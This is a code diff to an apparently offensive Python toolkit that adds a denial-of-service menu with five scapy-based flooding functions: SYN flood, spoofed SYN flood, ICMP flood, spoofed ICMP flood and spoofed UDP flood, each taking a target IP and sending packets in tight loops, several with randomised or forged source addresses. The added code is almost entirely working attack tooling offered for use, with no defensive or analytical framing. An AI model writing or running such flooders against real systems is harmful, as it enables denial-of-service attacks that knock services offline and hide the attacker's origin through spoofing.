@@ -91,6 +91,122 @@ def ip_spoof():
         packet = scapy.IP(src = RandShort(), dst = target)/scapy.ICMP()/"whoamI"
         send(packet)
 
+def syn_flood():
+    print("Insert target IP address: ")
+    target = input()
+    print("Attacking " + target + " with SYN flood.")
+
+    def flood():
+        packet = (IP(dst=target) / TCP(dport=139, flags="S") / ("payloadpayloadpayload")
+        )
+        send(packet, inter=0.000001, loop=1)
+
+
+    t1 = threading.Thread(target=flood())
+    t2 = threading.Thread(target=flood())
+    t3 = threading.Thread(target=flood())
+    t4 = threading.Thread(target=flood())
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+
+def spoofed_syn_flood():
+
+    print("Insert target IP address: ")
+    target = input()
+    print("Attacking " + target + " with SPOOFED SYN flood.")
+
+    def spoofed_flood():
+        packet = scapy.IP(src="192.168.4." + str(random.randint(2, 253)), dst=target) / \
+            scapy.TCP(dport=139, flags="S") / ("payloadpayloadpayload")
+        send(packet, inter=0.000001, loop=1)
+
+    t1 = threading.Thread(target=spoofed_flood())
+    t2 = threading.Thread(target=spoofed_flood())
+    t3 = threading.Thread(target=spoofed_flood())
+    t4 = threading.Thread(target=spoofed_flood())
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+
+def icmp_flood():
+    
+    print("Insert target IP address: ")
+    target = input()    
+    print("Attacking " + target + " with ICMP flood.")
+
+    def flood():
+        packet = scapy.IP(dst=target)/scapy.ICMP()/"random_payload"
+        send(packet, inter=0.00001, loop=1)
+
+
+    t1 = threading.Thread(target=flood())
+    t2 = threading.Thread(target=flood())
+    t3 = threading.Thread(target=flood())
+    t4 = threading.Thread(target=flood())
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+
+def spoofed_icmp_flood():
+    print("Insert target IP address: ")
+    target = input()
+    print("Insert the number of packets to send: ")
+    num_packets = int(input())
+
+    print("Attacking " + target + " with ICMP flood with " +
+    str(num_packets) + " packets")
+
+
+    def spoofed_flood():
+        for i in range(num_packets):
+            packet = scapy.IP(src=RandIP(), dst=target) / \
+                scapy.ICMP()/"random_payload"
+            send(packet)
+
+
+    t1 = threading.Thread(target=spoofed_flood())
+    t2 = threading.Thread(target=spoofed_flood())
+    t3 = threading.Thread(target=spoofed_flood())
+    t4 = threading.Thread(target=spoofed_flood())
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+
+def spoofed_udp_flood():
+
+    print("Insert target IP address: ")
+    target = input()
+
+    print("Starting UDP flood attack towards " + target + " ...")
+
+    def spoofed_flood():
+        try:
+            packet = scapy.IP(src=str(RandIP()), dst=target) / \
+                scapy.UDP(dport=RandShort()) / ("X" * RandByte())
+            send(packet, verbose=0, loop=1, inter=0.001)
+        except KeyboardInterrupt as e:
+            sys.exit(1)
+
+
+    t1 = threading.Thread(target=spoofed_flood())
+    t2 = threading.Thread(target=spoofed_flood())
+    t3 = threading.Thread(target=spoofed_flood())
+    t4 = threading.Thread(target=spoofed_flood())
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+
 def choose_recon():
     #clear the screen
     os.system("clear")
@@ -144,9 +260,27 @@ def choose_dos():
     print("2. Spoofed SYN Flood")
     print("3. ICMP Flood")
     print("4. Spoofed ICMP Flood")
-    print("4. UDP Flood")
-    print("5. Exit")                                            
+    print("5. Spoofed UDP Flood")
+    print("6. Exit")                                            
     print("-----------------------------------------------------------------------------------------")
+    choice = input("Enter your choice: ")
+    if choice == "1":
+        syn_flood()
+    elif choice == "2":
+        spoofed_syn_flood()
+    elif choice == "3":
+        icmp_flood()
+    elif choice == "4":
+        spoofed_icmp_flood()
+    elif choice == "5":
+        spoofed_udp_flood()
+    elif choice == "6":
+        print("Back to main menu.")
+        os.system("clear")
+        main()
+    else:
+        print("Invalid choice. Try again.")
+        choose_dos()
 
 def choose_exploit():
     os.system("clear")                                   
